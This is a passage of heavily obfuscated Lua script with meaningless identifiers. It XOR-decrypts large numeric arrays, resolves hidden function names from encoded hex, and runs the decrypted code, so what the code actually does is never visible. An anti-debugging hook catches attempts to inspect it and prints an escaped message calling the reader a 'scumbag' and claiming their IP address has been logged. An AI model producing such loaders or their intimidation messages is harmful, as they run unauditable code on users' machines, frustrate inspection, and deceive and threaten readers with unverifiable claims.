  96, 58, 238, 107, 19, 115, 183, 146, 60, 125, 111, 125, 67, 3, 3, 22, 55, 6, 76, 125, 76, 99, 89, 18, 116, 61, 110, 55,
  10, 56, 108, 88, 65, 52, 83, 59, 102, 5, 69, 32, 43, 74, 91, 142, 2, 34, 75, 87, 94, 33, 103, 249, 170, 21, 21, 29,
  111, 163, 46, 64, 79, 38, 83, 16, 87, 69, 122, 64, 76, 228, 220, 51, 87, 74, 66, 55, 35, 106, 82, 83, 30, 87, 96, 55,
  87, 95, 186, 18, 212, 53, 124, 44, 7, 151, 17, 107, 18, 139, 22, 93, 182, 21, 72, 67, 84, 55, 42, 115, 24, 104, 65,
  106, 251, 15, 81, 65, 64, 104, 252, 40, 40, 87, 96, 125, 87, 22, 68, 3, 38, 69, 61, 74, 9, 94, 66, 75, 62, 95, 7, 10,
  20, 75, 118, 151, 84, 249, 60, 134, 20, 92, 91, 63, 114, 15, 32, 218, 109, 48, 62, 107, 4, 24, 115, 106, 0, 61, 108,
  55, 5, 48, 97, 55, 43, 103, 87, 109, 62, 25, 9, 114, 0, 97, 38, 28, 35, 24, 104, 14, 79, 71, 8, 80, 102, 93, 42, 17,
  31, 28, 68, 188, 4, 41, 30, 109, 90, 108, 75, 229, 189, 59, 74, 90, 76, 91, 247, 41, 97, 114, 73, 22, 93, 41, 36, 107,
  142, 126, 39, 117, 38, 11, 115, 66, 61, 89, 91, 54, 84, 55, 106, 21, 23, 75, 127, 46, 86, 15, 173, 113, 18, 239, 17,
  107, 94, 178, 95, 80, 125, 32, 18, 87, 108, 125, 36, 33, 183, 22, 77, 23, 97, 103, 114, 35, 59, 214, 103, 80, 63, 80,
  134, 108, 40, 115, 58, 21, 40, 18, 95, 102, 20, 198, 78, 12, 98, 34, 123, 89, 103, 107, 117, 49, 41, 86, 101, 23, 75,
  31, 87, 4, 140, 79, 87, 33, 84, 51, 61 }, "wOR2SwOwHKAJGLMd6Tkwyl2btZ"); pUvqgpvNM5OtlQqNoCh2EAcWxRMveHwMOar3RUc7Mrg7K8PRwIg =
jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG; icDS5hWBrYXscEz89pPP2zkTRCHMQFqxcY25cXy4VGrAmEnWzmSc4bXUPgFWU0JJyhA =
jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG; nc6N3n1p0h8RMyYms06Yfg4fpj9KvX0VpCoOQaCknBTv5VnEdKFyZuCiyMA5vQYUP73WK =
icDS5hWBrYXscEz89pPP2zkTRCHMQFqxcY25cXy4VGrAmEnWzmSc4bXUPgFWU0JJyhA; stdZKL58hdJrsXVZkWKOGltI8Blay4SdP8HxVOQXkOtJONW1iJ5UphyuSiiSqOtVpznGO5pDqSR =
nc6N3n1p0h8RMyYms06Yfg4fpj9KvX0VpCoOQaCknBTv5VnEdKFyZuCiyMA5vQYUP73WK; yAIj7LE2GY2UCGKym51RRosB9Wy2137p0Q92UPTPLSE0IcSxFJtHkahVBvWIm91JYUycNF =
stdZKL58hdJrsXVZkWKOGltI8Blay4SdP8HxVOQXkOtJONW1iJ5UphyuSiiSqOtVpznGO5pDqSR; d0gIkch9pjFQuDssS9yi8OcouMO7JcYxaeJT0ZiNWYw5rA8U7dYNKV0bnvJIfbofIWm =
yAIj7LE2GY2UCGKym51RRosB9Wy2137p0Q92UPTPLSE0IcSxFJtHkahVBvWIm91JYUycNF; rkLSRPFJfFmeqxuv4w4SHCUgWPiDdG30a3BAZnfbxIqvHXuV5tijDp3si9jic9PkbT =
d0gIkch9pjFQuDssS9yi8OcouMO7JcYxaeJT0ZiNWYw5rA8U7dYNKV0bnvJIfbofIWm; co51Qoz2A4AiaC2nUEuF2xKmk0PrVYuqKBTMrQm98CNPNqfKDdLsZWcX3bfkbdD5jywain5 =
rkLSRPFJfFmeqxuv4w4SHCUgWPiDdG30a3BAZnfbxIqvHXuV5tijDp3si9jic9PkbT; gOUkqd8dIhiqWZFqUBSvK8SUU4JnBWKomqaTdHMRNYBLK56GwzMjfYFjIdGpD6tzX3G6M =
co51Qoz2A4AiaC2nUEuF2xKmk0PrVYuqKBTMrQm98CNPNqfKDdLsZWcX3bfkbdD5jywain5; kINgdggfgSN2wTQCVK8zsIUI9BZICc5WXJDRGMIcCUdxu3JBG7zj1WBJp =
gOUkqd8dIhiqWZFqUBSvK8SUU4JnBWKomqaTdHMRNYBLK56GwzMjfYFjIdGpD6tzX3G6M; v2YajOREYnHJwiUTxznHbfoBnBwpSvCZPY8mRynhqn5pVjMQs9tOvke1CGTppPIC1sxQJp =
kINgdggfgSN2wTQCVK8zsIUI9BZICc5WXJDRGMIcCUdxu3JBG7zj1WBJp; pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG =
v2YajOREYnHJwiUTxznHbfoBnBwpSvCZPY8mRynhqn5pVjMQs9tOvke1CGTppPIC1sxQJp; tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk = function(
  a)
  K, F = 2455671367730918, 16384 + 3790; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; kD6kgoTQ9ttajLDJoX0JUQ0oeHCXMKdVjC9tz2cCLeoPW0a76avfbFKw5KCMIUq4 = function(b)
  co = coroutine.create(b)
  bxyfNHnVysHsl3NprSmq4So4GwgXJKH3JHZQeESyBhUMLdLFwtSz43v6Mz067F1SiLkl8N = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(bxyfNHnVysHsl3NprSmq4So4GwgXJKH3JHZQeESyBhUMLdLFwtSz43v6Mz067F1SiLkl8N, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return bxyfNHnVysHsl3NprSmq4So4GwgXJKH3JHZQeESyBhUMLdLFwtSz43v6Mz067F1SiLkl8N
end; lx5NszMhAnJS1ZfeaJpspTkZOgyryrPBrr9nTSAOSTjgDaPlsVVBsLqskQrGFjOOZSqhZK = function(f, g)
  nWW8ijaV8mryl4aAodeIidlEaCm6fLiKgJA3HiqE1wgMASHzJ8PDMSIaybrXeY8wjrWbaM = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; kBdGiMrSzMvrt96MWyJwBXcFX5kSbE8jSewk2oSupQStk7Xs5Fi6lfI9uyt6Wo0We = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; ajw1lMCDFhBBptNbGc4s6eHP9QlnwI8FHWyURNUd7EcJJR674kX4Cd2QdQWs9u = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      nWW8ijaV8mryl4aAodeIidlEaCm6fLiKgJA3HiqE1wgMASHzJ8PDMSIaybrXeY8wjrWbaM(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; paa6ZJmqx5lvgFWtXrt23vFvO01zXQIJRD0WERiLa1bpefTG5inMgasOfBkGW1z3ltcMC4PwQ7T = function(p, n)
    pBq7aveGkzHJdqTr4BpYZKzpvwEL8swmw857AGF9bmpD60aPTGT8xTGbIUkIP0G5X = ""
    for k, q in pairs(p) do pBq7aveGkzHJdqTr4BpYZKzpvwEL8swmw857AGF9bmpD60aPTGT8xTGbIUkIP0G5X =
      pBq7aveGkzHJdqTr4BpYZKzpvwEL8swmw857AGF9bmpD60aPTGT8xTGbIUkIP0G5X ..
      pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG
      [tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('B4') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('97') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('D1') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('D6') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('45') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('10')]
      [tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('84') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('F3') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('BE') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('D1')](
      q) end
    ; n(pBq7aveGkzHJdqTr4BpYZKzpvwEL8swmw857AGF9bmpD60aPTGT8xTGbIUkIP0G5X)
  end; kBdGiMrSzMvrt96MWyJwBXcFX5kSbE8jSewk2oSupQStk7Xs5Fi6lfI9uyt6Wo0We(f,
    function(r) ajw1lMCDFhBBptNbGc4s6eHP9QlnwI8FHWyURNUd7EcJJR674kX4Cd2QdQWs9u(r, g,
        function(s) paa6ZJmqx5lvgFWtXrt23vFvO01zXQIJRD0WERiLa1bpefTG5inMgasOfBkGW1z3ltcMC4PwQ7T(s,
            function(t) if #kD6kgoTQ9ttajLDJoX0JUQ0oeHCXMKdVjC9tz2cCLeoPW0a76avfbFKw5KCMIUq4(pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG[tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('7F') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('28') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('BE') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('67')]) == 1 then if pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG[tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('7F') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('28') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('BE') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('67')] == pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG[tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('0B') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('D1') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('D6') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('45') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('97')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG[tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('7F') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('28') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('BE') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('67')](t) then
                    pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG
                        [tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('7F') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('28') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('BE') .. tAuRO9QsfnJ3fur0ah330Gy0LNrbumWWZYJi2gZBqQ63GKm729qVljSk('67')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; lx5NszMhAnJS1ZfeaJpspTkZOgyryrPBrr9nTSAOSTjgDaPlsVVBsLqskQrGFjOOZSqhZK(
{ 1203, 1209, 888, 1043, 771, 882, 636, 1102, 574, 885, 898, 812, 680, 879, 1175, 1065, 662, 1010, 941, 639, 612, 661,
  775, 1116, 1122, 553, 564, 675, 945, 685, 1045, 821, 678, 673, 562, 1070, 923, 715, 1120, 927, 587, 554, 767, 726, 779,
  569, 1118, 969, 667, 830, 894, 657, 857, 982, 772, 1169, 696, 664, 762, 1179, 622, 1030, 1008, 547, 581, 544, 819,
  1144, 1075, 949, 997, 1101, 709, 567, 1181, 963, 1130, 1163, 631, 732, 977, 571, 769, 846, 626, 1170, 1036, 897, 621,
  1142, 616, 1155, 1005, 1180, 727, 1044, 854, 820, 719, 1088, 620, 568, 737, 580, 794, 1202, 545, 1023, 1125, 993, 929,
  876, 1092, 733, 565, 985, 646, 827, 755, 613, 1021, 962, 552, 950, 983, 725, 1015, 669, 720, 710, 712, 932, 679, 1123,
  892, 990, 817, 742, 1085, 1003, 672, 768, 579, 1208, 1147, 1037, 1100, 582, 603, 651, 873, 1186, 1176, 559, 740, 1134,
  849, 1188, 991, 688, 1073, 624, 951, 1033, 953, 1172, 648, 971, 874, 1140, 711, 595, 591, 1080, 1068, 605, 1110, 796,
  575, 660, 604, 841, 979, 632, 684, 753, 1173, 729, 1035, 1055, 826, 1197, 946, 676, 1156, 992, 1050, 925, 665, 584,
  738, 590, 723, 1054, 860, 868, 996, 1038, 916, 904, 886, 1058, 776, 619, 721, 1047, 722, 558, 638, 609, 1112, 998, 919,
  1059, 1183, 765, 940, 1026, 1011, 811, 1052, 906, 643, 682, 614, 751, 1184, 1196, 848, 851, 1053, 934, 551, 877, 902,
  883, 810, 1027, 852, 576, 813, 548, 834, 837, 1049, 623, 1016, 815, 645, 700, 1114, 770, 791, 570, 556, 844, 938, 1067,
  546, 1152, 1046, 1162, 656, 561, 1132, 928, 1024, 750, 903, 920, 956, 1009, 875, 694, 630, 615, 1013, 1145, 1193, 1042,
  1077, 578, 663, 955, 984, 890, 978, 596, 802, 1071, 832, 1004, 1204, 783, 901, 937, 914, 1079, 683, 880, 1165, 989,
  628, 774, 1090, 577, 1126, 1081, 777, 585, 1028, 881, 1119, 1034, 563, 698, 611, 948, 884, 843, 893, 866, 1089, 870,
  627, 942, 836, 1190, 960, 1086, 1078, 1074, 823, 965, 1039, 699, 799, 944, 702, 600, 560, 1199, 838, 1195, 691, 1091,
  808, 792, 637, 1069, 936, 831, 1154, 1136, 908, 917, 671, 790, 1127, 1149, 900, 964, 803, 1171, 739, 1040, 635, 970,
  1103, 686, 744, 869, 856, 1076, 749, 1146, 1018, 1093, 1168, 865, 788, 833, 1063, 1087, 921, 1143, 1135, 814, 1157,
  1062, 867, 1019, 718, 1029, 697, 1150, 824, 845, 759, 1060, 967, 766, 922, 734, 695, 952, 939, 1139, 872, 1022, 1097,
  822, 1104, 974, 745, 703, 1191, 689, 1108, 786, 761, 701, 1124, 708, 735, 1061, 706, 1211, 606, 912, 853, 1105, 930,
  640, 692, 1006, 1160, 573, 910, 588, 713, 859, 763, 602, 1141, 693, 647, 690, 980, 918, 610, 724, 1082, 583, 862, 677,
  658, 1212, 747, 1200, 787, 840, 1198, 1072, 592, 847, 911, 1099, 629, 659, 1138, 825, 1148, 653, 778, 797, 1158, 913,
  1051, 818, 804, 1106, 1161, 807, 850, 1133, 864, 1167, 1098, 1182, 926, 806, 618, 1187, 633, 988, 1094, 764, 625, 741,
  1025, 1117, 1057, 895, 557, 572, 756, 1002, 1159, 968, 1111, 1115, 1041, 705, 1206, 1095, 597, 1109, 728, 652, 644,
  961, 666, 1012, 935, 707, 795, 986, 1151, 773, 889, 650, -1, 45, 59, 51, 67, 77, 95, 191, 30, 31, 68, 58, 109, 61, 97,
  40, 96, 16, 21, 33, 76, 80, 6, 2, 172, 125, 23, 126, 8, 79, 38, 16, 36, 115, 119, 10, 95, 21, 33, 65, 3, 120, 87, 87,
  193, 68, 25, 37, 110, 77, 79, 129, 136, 124, 27, 67, 232, 253, 103, 246, 5, 68, 98, 122, 36, 206, 203, 9, 24, 23, 103,
  57, 27, 62, 89, 179, 76, 83, 49, 20, 5, 39, 87, 8, 79, 107, 67, 81, 107, 31, 116, 81, 74, 21, 29, 103, 81, 107, 104,
  120, 56, 40, 52, 38, 71, 76, 66, 77, 38, 45, 14, 109, 94, 239, 64, 55, 49, 77, 6, 36, 17, 77, 3, 88, 18, 36, 151, 89,
  108, 122, 24, 91, 36, 41, 74, 78, 3, 53, 103, 209, 6, 99, 99, 71, 109, 251, 67, 77, 33, 84, 122, 33, 67, 101, 61, 9,
  33, 3, 59, 34, 31, 105, 105, 10, 103, 106, 21, 34, 68, 67, 101, 11, 8, 68, 211, 63, 15, 55, 33, 93, 17, 117, 51, 72,
  19, 83, 75, 69, 202, 252, 42, 105, 30, 76, 107, 43, 93, 81, 105, 34, 87, 13, 84, 76, 179, 71, 248, 33, 28, 50, 240, 72,
  18, 20, 46, 179, 165, 4, 130, 7, 12, 18, 115, 80, 108, 84, 3, 33, 47, 41, 122, 51, 102, 62, 124, 67, 17, 14, 53, 17,
  40, 19, 109, 84, 115, 115, 27, 106, 82, 52, 118, 175, 79, 83, 113, 30, 65, 4, 161, 157, 25, 76, 107, 164, 87, 110, 76,
  153, 65, 36, 29, 91, 87, 82, 126, 67, 98, 13, 113, 16, 66, 55, 0, 115, 89, 58, 191, 30, 91, 23, 2, 50, 10, 24, 101, 63,
  68, 78, 101, 98, 177, 80, 1, 19, 13, 87, 42, 93, 79, 19, 20, 32, 76, 175, 76, 79, 13, 103, 103, 182, 41, 110, 63, 43,
  118, 9, 16, 80, 98, 5, 122, 96, 18, 46, 18, 97, 182, 54, 82, 44, 13, 5, 126, 61, 118, 219, 63, 41, 103, 16, 111, 76,
  101, 53, 128, 58, 5, 205, 72, 24, 83, 9, 97, 139, 69, 37, 11, 58, 6, 76, 83, 92, 40, 224, 87, 35, 4, 68, 37, 111, 105,
  19, 10, 106, 79, 115, 43, 29, 65, 148, 32, 147, 18, 68, 107, 63, 0, 0, 60, 76, 23, 207, 44, 52, 93, 233, 100, 19, 113,
  89, 42, 64, 178, 87, 104, 91, 13, 208, 9, 57, 77, 27, 125, 22, 239, 101, 110, 46, 115, 89, 213, 124, 87, 253, 151, 32,
  81, 72, 17, 249, 51, 110, 66, 14, 89, 228, 77, 60, 9, 125, 96, 4, 162, 179, 119, 3, 89, 121, 44, 75, 30, 105, 56, 89,
  28, 60, 22, 37, 3, 53, 127, 7, 233, 46, 56, 38, 57, 25, 22, 84, 79, 9, 29, 21, 51, 39, 4, 52, 39, 89, 88, 80, 9, 92, 9,
  36, 125, 79, 77, 122, 6, 29, 92, 58, 20, 80, 221, 43, 92, 103, 36, 26, 101, 79, 194, 68, 72, 109, 126, 107, 44, 63,
  227, 56, 206, 26, 75, 98, 42, 115, 66, 104, 10, 84, 118, 43, 46, 44, 66, 22, 53, 144, 83, 26, 102, 29, 46, 103, 46, 80,
  9, 23, 21, 6, 63, 111, 43, 105, 6, 50, 26, 68, 79, 110, 23, 159, 21, 87, 96, 79, 90, 62, 29, 102, 89, 20, 96, 16, 63,
  147, 38, 29, 16, 111, 55, 111, 52, 73, 101, 169, 1, 102, 105, 1, 33, 182, 21, 76, 127, 84, 1, 11, 62, 54, 45, 5, 68,
  69, 44, 102, 58, 59, 38, 115, 7, 24, 8, 79, 59, 101, 14, 105, 221, 55, 27, 1, 41, 12, 5, 105, 110, 99, 20, 21, 127,
  131, 96, 28, 101, 108, 104, 84, 42, 26, 115, 105, 115, 95, 39, 81, 180, 101, 156, 109, 61, 110, 111, 115, 111, 242, 33,
  101, 26, 103, 33, 134, 35, 22, 254, 33, 43 }, "oFZoObowlIqm5SdMtplVGBK7EN"); m21MiiGc9THA18azWUBNppyF1hetZrsByvYMA0vllPQlbe1WQGSspPOtuYmQWxRwA0vcP =
pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG; cJAQFT57EY6GlJutFx6JZF3Wd4O0A0aEUBnPLHh4b4hwSzOdcZB6iIk7K =
pMYMscvRAiz8abVKx110u2ZZF4jT8NXEHY7QpEpRpHuxXK7jX9pKpINUngxECVs5Y67Um5OkXoG; eGJNIfcgMkRbsu4JU30BeFhjf7yqY8RmySBNuMmunv65S4tdvn6zM =
cJAQFT57EY6GlJutFx6JZF3Wd4O0A0aEUBnPLHh4b4hwSzOdcZB6iIk7K; nljQ1ljm6460kYOyzgLKIkZSAOCIuGT3G2fhjwD8tdz6HGnMEj1L9BHaY9pV6gbAo6QsUUD4 =
eGJNIfcgMkRbsu4JU30BeFhjf7yqY8RmySBNuMmunv65S4tdvn6zM; x4xj02k9jgTuT6pISFmZjLpaVbvAxJXLaGe8KWbambL5b4Z4BAJT =
nljQ1ljm6460kYOyzgLKIkZSAOCIuGT3G2fhjwD8tdz6HGnMEj1L9BHaY9pV6gbAo6QsUUD4; plZtAXbqu9K8nmyzIeHOrREengSf2zIhwHOIT7KO3OKP9mtInh6lz =
x4xj02k9jgTuT6pISFmZjLpaVbvAxJXLaGe8KWbambL5b4Z4BAJT; aUxboik40hqxtx2i4jOwmBrYzvaxrHkFFJR841nUdI9ziMLyiZF3SlI8t6ovXH3gdHVg =
plZtAXbqu9K8nmyzIeHOrREengSf2zIhwHOIT7KO3OKP9mtInh6lz; rQtEOhLXNQk70cXcLve9Tphp9xx18fAdXw9JgLtRLjvW60RlKnkytQpBNv9cv =
aUxboik40hqxtx2i4jOwmBrYzvaxrHkFFJR841nUdI9ziMLyiZF3SlI8t6ovXH3gdHVg; waNmrpt5hWDlRaGseEjrW50an2qhIP3iHt2TcWQ6aD8Utdb7t8TWN7eDHI8l2 =
rQtEOhLXNQk70cXcLve9Tphp9xx18fAdXw9JgLtRLjvW60RlKnkytQpBNv9cv; qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l =
waNmrpt5hWDlRaGseEjrW50an2qhIP3iHt2TcWQ6aD8Utdb7t8TWN7eDHI8l2; lcl8s0YqqnSV0WGCaig0IWmkT4ZjTIEJbczYaRHFM0Np9EP6KuMR3pkcDXmXPZsYguAj5 = function(
  a)
  K, F = 7719501702120425, 16384 + 2809; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; aPmtPufiU6kAyLmTxlZl7uo8xnOW0fjSZJsiLF45OpnwZiOSk97Jo = function(b)
  co = coroutine.create(b)
  v5ZXql5OzNBL2U1vHx2DK8i431wJHi4py7o8jhNKBAxc5DNrX3FAW8Jzx2 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(v5ZXql5OzNBL2U1vHx2DK8i431wJHi4py7o8jhNKBAxc5DNrX3FAW8Jzx2, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return v5ZXql5OzNBL2U1vHx2DK8i431wJHi4py7o8jhNKBAxc5DNrX3FAW8Jzx2
end; q0NXcVocwjVOXNJcW240vxH53ppVrs3gECiivbZhMaIzF6t7OAi6LRluecl7oPPGtm = function(f, g)
  kDtFnYUpeaw5yqUd0CyteEDfilP4g2bHLD34iH51yksdmi9YL9CVHbTFfOc6HqzIBx2S = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; nDT7TfBQhzS2EACZLgSaqzYnfw60aGxvKOUho3HLs5TaiQZ0YXuADq8VLet6YVs = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; e20uXBFxJY0JFgK5R7YcIxcuOOvufKh6krzcJlPo5ApJoUl40YmZDd7xU6SEL = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      kDtFnYUpeaw5yqUd0CyteEDfilP4g2bHLD34iH51yksdmi9YL9CVHbTFfOc6HqzIBx2S(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; dYWfI6nbX0necIBwlqdMOrn3x4E9jOBidCsMhSHnoDzwp4KQdKI0OFdBPTFX = function(p, n)
    fkUzD8hm5AUanr09PRWaqa5wu0Vtk56uAbzc4N5bgaIsJDuV5ZXbi = ""
    for k, q in pairs(p) do fkUzD8hm5AUanr09PRWaqa5wu0Vtk56uAbzc4N5bgaIsJDuV5ZXbi =
      fkUzD8hm5AUanr09PRWaqa5wu0Vtk56uAbzc4N5bgaIsJDuV5ZXbi ..
      qnbfjzvcwP8XRgzYRG8y6aq01LgKM3r5asO9jjmBU1P6Lqn7NQ33l
